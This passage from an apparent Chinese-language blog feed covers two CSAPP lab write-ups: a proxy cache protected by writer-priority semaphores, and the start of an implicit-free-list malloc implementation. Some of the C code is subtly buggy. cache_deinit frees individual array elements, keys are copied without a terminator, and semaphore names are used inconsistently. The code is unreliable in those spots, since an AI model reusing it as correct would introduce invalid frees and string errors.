class="keyword">long</span> age;      <span class="comment">/* use to implement LRU */</span></span><br><span class="line">&#125;cache_item;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    cache_item *ci;</span><br><span class="line">    <span class="keyword">size_t</span> ci_num;     <span class="comment">/* cache item pair_num */</span></span><br><span class="line">&#125;cache;</span><br></pre></td></tr></table></figure><p>cache_item定义了一个cache block的数据及元数据。</p><p>cache则由多个cache_item组成了。</p><p>然后是要用到的一些函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_init</span><span class="params">(cache *cp)</span></span>;</span><br><span class="line"><span class="comment">/* cache_put */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_put</span><span class="params">(cache *cp, <span class="keyword">char</span> *key, <span class="keyword">char</span> *data, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span>;</span><br><span class="line"><span class="comment">/* cache_get */</span></span><br><span class="line"><span class="function">cache_item *<span class="title">cache_get</span><span class="params">(cache *cp, <span class="keyword">char</span> *key)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_deinit</span><span class="params">(cache *cp)</span></span>;</span><br></pre></td></tr></table></figure><p>接口很简单，就get、put。</p><p>先看看简单的init和deinit：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cache init</span></span><br><span class="line"><span class="comment"> * @param cp</span></span><br><span class="line"><span class="comment"> * @return 0 sucess</span></span><br><span class="line"><span class="comment"> *         -1 failed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_init</span><span class="params">(cache *cp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!cp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">/* cache_get cache item pair_num */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> ci_num = MAX_CACHE_SIZE / MAX_OBJECT_SIZE;</span><br><span class="line">    cp-&gt;ci = (cache_item *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(cache_item) * ci_num);</span><br><span class="line">    cp-&gt;ci_num = ci_num;</span><br><span class="line">    <span class="comment">/* init every cache block */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; cp-&gt;ci_num; i++) &#123;</span><br><span class="line">        cp-&gt;ci[i].effect_size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* semaphore init */</span></span><br><span class="line">    sem_init(&amp;rcounter_mutex, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    sem_init(&amp;res_mutex, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    sem_init(&amp;w_mutex, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * deinit</span></span><br><span class="line"><span class="comment"> * @param cp</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_deinit</span><span class="params">(cache *cp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!cp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; cp-&gt;ci_num; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(&amp;cp-&gt;ci[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说get和put之前，先说说读写锁-写优先的操作。</p><ol><li>写-写互斥</li><li>写-读互斥</li><li>读-读共享</li><li>读加锁时，后续有读线程又有写线程时，写线程优先。</li></ol><p>看PV实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> read_counter = <span class="number">0</span>;<span class="comment">// 记录读者数</span></span><br><span class="line"><span class="keyword">sem_t</span> rc_mutex;<span class="comment">// 读者数的操作锁</span></span><br><span class="line"><span class="keyword">sem_t</span> res_mutex;<span class="comment">// 互斥资源锁</span></span><br><span class="line"><span class="keyword">sem_t</span> w_mutex;<span class="comment">// 实现写优先</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写者</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">P(&amp;w_mutex);<span class="comment">// 占用w_mutex, 阻塞读者</span></span><br><span class="line">P(&amp;res_mutex);</span><br><span class="line"><span class="keyword">do</span> <span class="built_in">write</span></span><br><span class="line">V(&amp;res_mutex);</span><br><span class="line">V(&amp;w_mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读着</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">P(&amp;w_mutex);</span><br><span class="line">P(&amp;rc_mutex);</span><br><span class="line">read_counter++;</span><br><span class="line"><span class="keyword">if</span>(read_counter == <span class="number">1</span>)</span><br><span class="line">P(&amp;res_mutex);</span><br><span class="line">V(&amp;rc_mutex);</span><br><span class="line">V(&amp;w_mutex);</span><br><span class="line"><span class="keyword">do</span> <span class="built_in">read</span></span><br><span class="line">P(&amp;rc_mutex);</span><br><span class="line">read_counter--;</span><br><span class="line"><span class="keyword">if</span>(read_counter == <span class="number">0</span>)</span><br><span class="line">V(&amp;res_mutex);</span><br><span class="line">V(&amp;rc_mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ok, 有了以上基础知识，写cache_get和cache_put就会很简单了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * put data into cache</span></span><br><span class="line"><span class="comment"> * @param cp</span></span><br><span class="line"><span class="comment"> * @param key</span></span><br><span class="line"><span class="comment"> * @param data</span></span><br><span class="line"><span class="comment"> * @param size</span></span><br><span class="line"><span class="comment"> * @return  0 sucess</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cache_put</span><span class="params">(cache *cp, <span class="keyword">char</span> *key, <span class="keyword">char</span> *data, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> age_counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> empty_block_idx = <span class="number">-1</span>;</span><br><span class="line">    cache_item *ci;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* write start */</span></span><br><span class="line">    P(&amp;w_mutex);</span><br><span class="line">    P(&amp;res_mutex);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* increment age counter */</span></span><br><span class="line">    age_counter++;</span><br><span class="line">    <span class="comment">/* first try to find an empty block */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; cp-&gt;ci_num; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cp-&gt;ci[i].effect_size == <span class="number">0</span>) &#123;</span><br><span class="line">            empty_block_idx = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* need evict ?*/</span></span><br><span class="line">    <span class="keyword">if</span> (empty_block_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">        empty_block_idx = evict(cp);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ci = &amp;cp-&gt;ci[empty_block_idx];</span><br><span class="line">    <span class="built_in">memcpy</span>(ci-&gt;key, key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    <span class="built_in">memcpy</span>(ci-&gt;data, data, <span class="built_in">size</span>);</span><br><span class="line">    ci-&gt;effect_size = <span class="built_in">size</span>;</span><br><span class="line">    ci-&gt;age = age_counter;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* write end*/</span></span><br><span class="line">    V(&amp;res_mutex);</span><br><span class="line">    V(&amp;w_mutex);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * get data from cache in terms of key</span></span><br><span class="line"><span class="comment"> * @param cp</span></span><br><span class="line"><span class="comment"> * @param key</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> *         NULL not found</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">cache_item *<span class="title">cache_get</span><span class="params">(cache *cp, <span class="keyword">char</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cache_item *ci = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* read start*/</span></span><br><span class="line">    P(&amp;w_mutex);</span><br><span class="line">    P(&amp;rcounter_mutex);</span><br><span class="line">    rcounter++;</span><br><span class="line">    <span class="keyword">if</span> (rcounter == <span class="number">1</span>)</span><br><span class="line">        P(&amp;res_mutex);</span><br><span class="line">    V(&amp;rcounter_mutex);</span><br><span class="line">    V(&amp;w_mutex);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; cp-&gt;ci_num; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cp-&gt;ci[i].effect_size != <span class="number">0</span> &amp;&amp;</span><br><span class="line">            !<span class="built_in">strcmp</span>(cp-&gt;ci[i].key, key)) &#123;</span><br><span class="line">            ci = &amp;cp-&gt;ci[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    P(&amp;rcounter_mutex);</span><br><span class="line">    rcounter--;</span><br><span class="line">    <span class="keyword">if</span> (rcounter == <span class="number">0</span>)</span><br><span class="line">        V(&amp;res_mutex);</span><br><span class="line">    V(&amp;rcounter_mutex);</span><br><span class="line">    <span class="keyword">return</span> ci;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-cache实现的额外想法"><a href="#4-cache实现的额外想法" class="headerlink" title="4. cache实现的额外想法"></a>4. cache实现的额外想法</h3><p>其实cache最开始我是准备用Log-Strucutre的实现，但是发现实现起来很复杂，而且csapp的测试跑不了太久，Log-Sturcutre的优点没法充分利用。下面简单说一下思路。Log-Strucutre的特点就是Only-Append. 题目的要求是缓存从server返回的数据，而这些数据的大小不一，如果按照上文的实现，<strong>必然会导致很多内部碎片</strong>。而采用only-append的思想，则不存在内部碎片的问题，如下图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200906101718082.png" alt="image-20200906101718082"></p><p>但是这样又会存在一个新问题，那就是cache空间是有限的，我们最后总会evict掉某些块，<strong>那就很容产生外部碎片问题，</strong>这该怎么解决呢？开启一个compact线程就好了，compact线程可以周期性的对整个内存空间做压缩处理，去掉外部碎片问题。compact的触发点可以有两个：</p><ol><li>周期性触发</li><li>当前cache已满</li></ol><p>但是每次compact可能也会成为cache的读写性能瓶颈。 所以现在又该怎么办？</p><p>可以考虑<strong>“分页思想”，</strong>操作系统里面最经典的知识之一，要想提高系统的内存利用率，降低外部碎片和内部碎片，那就将内存分页，将每个取回的file进行分页,然后插入到“虚拟内存页”，不过这样需要维护页表了。实现难度较大，所以我也没做了，实在没时间继续耗在csapp上，不过还是想将这个思路写在这里，说不定未来我就回来写了呢。</p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>这个实验涉及的知识较多，网络编程（c语言的socket一言难尽啊，特别写过python和java后。。。），多线程并发，同步信号量，cache替换策略，每一个都是重要的知识点。所以也还是挺有收获的。</p><p>当然了，这也是csapp的最后一个lab，也就意味着我的csapp之旅告一段落了，但是csapp这本书是真的值得每个程序员多看几遍的，里面的每个知识点都相当重要。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本次lab Proxylab。 也是csapp的最后一个lab。&lt;/p&gt;
&lt;h2 id=&quot;1-实验目的&quot;&gt;&lt;a href=&quot;#1-实验目的&quot; class=&quot;headerlink&quot; title=&quot;1.实验目的&quot;&gt;&lt;/a&gt;1.实验目的&lt;/h2&gt;&lt;p&gt;proxylab, 从最终目的来看，我们实现的是一个代理服务器。proxy接收来client的请求，转发给server，并从server中取得数据后，返回给client。另外，proxy从server中取回数据后还需要做cache，这样，当另一个client请求相同的数据时，就不用从server端请求数据，降低了server的压力。&lt;/p&gt;
&lt;p&gt;再看看一些细节的要求，要求支持多线程请求，多线程涉及一些同步的问题，所以做的时候一定要考虑哪些是互斥资源，用什么方式同步等。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Csapp" scheme="https://www.ravenxrz.ink/categories/Csapp/"/>
    
    
      <category term="proxylab" scheme="https://www.ravenxrz.ink/tags/proxylab/"/>
    
  </entry>
  
  <entry>
    <title>Csapp-Malloclab题解</title>
    <link href="https://www.ravenxrz.ink/archives/36920455.html"/>
    <id>https://www.ravenxrz.ink/archives/36920455.html</id>
    <published>2020-08-26T08:45:31.000Z</published>
    <updated>2020-09-06T07:37:36.750Z</updated>
    
    <content type="html"><![CDATA[<p>本次lab，malloclab，自己手写一个内存分配器。</p><a id="more"></a><h2 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1. 实验目的"></a>1. 实验目的</h2><p>malloclab，简单明了的说就是实现一个自己的 malloc,free,realloc函数。做完这个实验你能够加深对指针的理解，掌握一些内存分配中的核心概念，如：如何组织heap，如何找到可用free block，采用first-fit, next-fit,best-fit?  如何在吞吐量和内存利用率之间做trade-off等。</p><p>就我个人的感受来说，malloclab的基础知识不算难，但是代码中充斥了大量的指针运算，为了避免硬编码指针运算，会定义一些宏，而定义宏来操作则会加大debug的难度（当然了，诸如linus这样的大神会觉得，代码写好了，为什么还用debug？），debug基本只能靠gdb和print，所以整体还是有难度了。</p><h2 id="2-背景知识"><a href="#2-背景知识" class="headerlink" title="2. 背景知识"></a>2. 背景知识</h2><p>这里简单说一下要做这个实验需要哪些背景知识。</p><p>首先，为了写一个alloctor,需要解决哪些问题。csapp本章的ppt中列出了一些关键问题：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/clip_image001.png" alt="Implementation Issues  How do we know how much memory to free given just a  pointer?  How do we keep track of the free blocks?  What do we do with the extra space when allocating a  structure that is smaller than the free block it is placed in?  How do we pick a block to use for allocation — many  might fit?  How do we reinsert freed block? "></p><p>第一个问题，free(ptr)这样的routine是如何知道本次释放的block的大小的？</p><p>很显然我们需要一些额外的信息来存放block的元信息。之类的具体做法是在block的前面添加一个word，存放分配的size和是否已分配状态。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826170802474.png" alt="image-20200826170802474"></p><p><strong>注意：这里只是给出了最简单的情况，实际操作中，额外的元数据不仅只有这些</strong></p><p>第二个问题，如何追踪free blocks?</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826170901374.png" alt="image-20200826170901374"></p><p>csapp一共给出了4种方案。其中implicit list在书上给出了源码，我个人实现了implicit list和explicit list。segregated free list感觉利用OO思想，把explicit list封装一下也是能够实现的，红黑树同理。</p><p>第三个问题，拆分策略（详见代码的place函数）</p><p>第四个问题，一般来说有 first-fit, next-fit和best-fit策略，我这里采用了最简单的first-fit策略。（这其实是一个trade-off的问题，看你是想要吞吐量高还是内存利用率高了）</p><p>ok，下面就来看看implicit list(书上有）和explicit list两种方案是如何实现的。</p><h2 id="3-Implicit-list"><a href="#3-Implicit-list" class="headerlink" title="3. Implicit list"></a>3. Implicit list</h2><p>下面是一个implicit list的组织方式和一个block的具体情况，一个block采用了双边tag，保证可以前向和后向索引。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200826171525409.png" alt="image-20200826171525409"></p><p>这种方案的优点：实现简单。缺点：寻找free block的开销过大。</p><p>现在说说lab中给的一些代码把：</p><ol><li>memlib，这个文件中，给出了heap扩展的方法，除此之外，我们还可以获取当前可用heap的第一个字节，最后一个字节，heap size等。具体实现是通过一个sbrk指针来操作的。</li><li>mdriver, 这个文件不用看，只用它编译出来的可执行文件即可，用于测试我们写的allocator是否正确。</li><li>mm.c， 这个就是我们要操作的文件了，主要实现三个函数 mm_malloc,mm_free,mm_realloc，我们再额外定义自己需要的函数。</li></ol><p>好的，下面再说说具体代码，因为代码中涉及到很多指针操作，我们对这些操作做一个峰装，用宏定义来操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WSIZE       4       <span class="comment">/* Word and header/footer size (bytes) */</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DSIZE       8       <span class="comment">/* Double word size (bytes) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNKSIZE  (1&lt;&lt;12)  <span class="comment">/* Extend heap by this amount (bytes) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX(x, y) ((x) &gt; (y)? (x) : (y))  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Pack a size and allocated bit into a word */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACK(size, alloc)  ((size) | (alloc)) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read and write a word at address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET(p)       (*(unsigned int *)(p))           </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT(p, val)  (*(unsigned int *)(p) = (val))   </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read the size and allocated fields from address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_SIZE(p)  (GET(p) &amp; ~0x7)                   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)                    </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of its header and footer */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HDRP(bp)       ((char *)(bp) - WSIZE)                     </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FTRP(bp)       ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE) </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of next and previous blocks */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_BLKP(bp)  ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_BLKP(bp)  ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE))) </span></span><br></pre></td></tr></table></figure><p>注释给出了每个宏的意义。</p><p>一些额外的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *free_list_head = <span class="literal">NULL</span>; <span class="comment">// 整个list的头部</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span></span>;<span class="comment">// heap 不够分配时，用于扩展heap大小</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">coalesce</span><span class="params">(<span class="keyword">void</span> *bp)</span></span>;<span class="comment">// free block时，可能存在一些前后也是free block的情况，这时需要做合并，不允许一条list上，同时存在两个连续的free block</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">find_fit</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>;<span class="comment">// 在list上找到可满足本次malloc请求的block</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">place</span><span class="params">(<span class="keyword">void</span> *bp, <span class="keyword">size_t</span> size)</span></span>; <span class="comment">// 放置当前块，如果size &lt; 本次block size - MIN_BLOCK ，则需要做split操作</span></span><br></pre></td></tr></table></figure><h3 id="mm-init"><a href="#mm-init" class="headerlink" title="mm_init"></a>mm_init</h3><p>这个函数对mm做初始化，工作包括：</p><ol><li>分配4个字，第0个字为pad，为了后续分配的块payload首地址能够是8字节对齐。</li><li>第1-2个字为序言块，free_list_head指向这里，相当于给list一个定义，不然我们从哪里开始search呢？</li><li>第3个字，结尾块，主要用于确定尾边界。</li><li>extend_heap, 分配一大块heap，用于后续malloc请求时分配。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_init - initialize the malloc package.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">// Create the inital empty heap</span></span><br><span class="line">    <span class="keyword">if</span>( (free_list_head = mem_sbrk(<span class="number">4</span> * WSIZE)) == (<span class="keyword">void</span> *)<span class="number">-1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PUT(free_list_head, <span class="number">0</span>);</span><br><span class="line">    PUT(free_list_head + (<span class="number">1</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>));</span><br><span class="line">    PUT(free_list_head + (<span class="number">2</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>));</span><br><span class="line">    PUT(free_list_head + (<span class="number">3</span> * WSIZE), PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">    free_list_head += (<span class="number">2</span> * WSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Extend the empty heap with a free block of CHUNKSIZE bytes</span></span><br><span class="line">    <span class="keyword">if</span>(extend_heap(CHUNKSIZE/WSIZE) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="extend-heap"><a href="#extend-heap" class="headerlink" title="extend_heap"></a>extend_heap</h3><p>工作：</p><ol><li>size更新，保证size为偶数个word</li><li>为当前分配的block添加元数据，即header和footer信息</li><li>更新尾边界</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate an even number of words to maintain alignment */</span></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * WSIZE : words * WSIZE;</span><br><span class="line">    <span class="keyword">if</span>( (<span class="keyword">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化free block的header/footer和epilogue header</span></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Coalesce if the previous block was free</span></span><br><span class="line">    <span class="keyword">return</span> 